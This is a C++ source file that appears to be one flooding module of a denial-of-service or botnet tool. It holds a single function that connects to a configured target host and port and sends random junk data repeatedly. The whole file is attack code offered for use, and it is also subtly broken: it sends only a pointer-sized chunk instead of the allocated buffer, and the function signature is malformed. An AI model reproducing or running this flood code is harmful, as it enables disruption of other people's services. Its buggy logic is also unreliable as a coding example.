#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#include "../headers/config.hpp"
#include "../headers/include.hpp"
#include "../headers/utils.hpp"

void TcpmixMethod(types) {
  int fd;
  int ttl = 255;
  sockaddr_in sa;

  if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
    return;
  };

  if (setsockopt(fd, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl)) == -1) {
    close(fd);
    return;
  }

  sa.sin_addr.s_addr = inet_addr(target.c_str());
  sa.sin_port = htons(port);
  sa.sin_family = AF_INET;

  if (connect(fd, (struct sockaddr*)&sa, sizeof(sa)) == -1) {
    close(fd);
    return;
  };

  int bufsize = RandomInt(FLOOD_BUF_SIZE);
  char* buf = new char[bufsize];
  RandomBuf(buf, bufsize);

  for (int i = 0; i <= 30; i++) {
    send(fd, buf, sizeof(buf), MSG_NOSIGNAL);
  }

  delete[] buf;
  buf = nullptr;
  close(fd);
}
